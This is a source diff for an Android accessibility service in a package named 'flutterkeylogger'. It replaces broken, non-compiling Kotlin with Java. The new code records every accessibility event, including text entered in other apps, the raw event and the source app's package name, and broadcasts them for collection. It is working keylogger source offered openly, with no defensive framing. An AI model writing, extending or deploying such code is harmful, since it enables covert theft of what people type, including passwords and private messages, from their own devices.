@@ -1,41 +1,44 @@
-package youtube.sidtube.flutterkeylogger
+package youtube.sidtube.flutterkeylogger;
 
-import android.accessibilityservice.AccessibilityService
-import android.content.Intent
-import android.content.IntentFilter
-import android.util.Log
-import android.view.accessibility.AccessibilityEvent
+import android.accessibilityservice.AccessibilityService;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
 
-class Accservice : AccessibilityService() {
-    override fun onServiceConnected() {
-        super.onServiceConnected()
-        Log.d("Service", "ss")
-        this.registerReceiver(LogReciever(), IntentFilter("android.accessibilityservice.AccessibilityService"))
+import androidx.localbroadcastmanager.content.LocalBroadcastManager;
+
+import java.util.HashMap;
+
+public class Accservice extends AccessibilityService {
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        makeTypeAndSend(event, AccessibilityEvent.eventTypeToString(event.getEventType()));
+
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent) { // Log.d("event",event.toString());
-        `when`(event.eventType)
-        run {
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
-            {
-                val data: `val` = event.text.toString()
-                datas.get("log") = data
-                datas.get("type") = "text"
-                Log.d("Keylogger", datas.toString())
-                channel.invokeMethod("test", datas)
-            }
-            AccessibilityEvent.TYPE_VIEW_FOCUSED
-            {}
-            AccessibilityEvent.TYPE_VIEW_CLICKED
-            {}
-            {}
-        }
-        val intent = Intent()
-        intent.putExtra("aa", event)
-        LogReciever().onReceive(this, intent)
+    void makeTypeAndSend(AccessibilityEvent event, String type) {
+        String data = event.getText().toString();
+        String packageName = event.getPackageName()!=null? event.getPackageName().toString():"";
+        HashMap<String, String> datas = new HashMap();
+        datas.put("log", data);
+        datas.put("raw",event.toString());
+        datas.put("packageName", packageName);
+        datas.put("type", type);
+        Intent intent = new Intent();
+        intent.putExtra("log", datas);
+        intent.setAction("android.accessibilityservice.AccessibilityService");
+        sendBroadcast(intent);
     }
 
-    override fun onInterrupt() {
-        unregisterReceiver(LogReciever())
+    @Override
+    public void onInterrupt() {
     }
 }
+
+
+
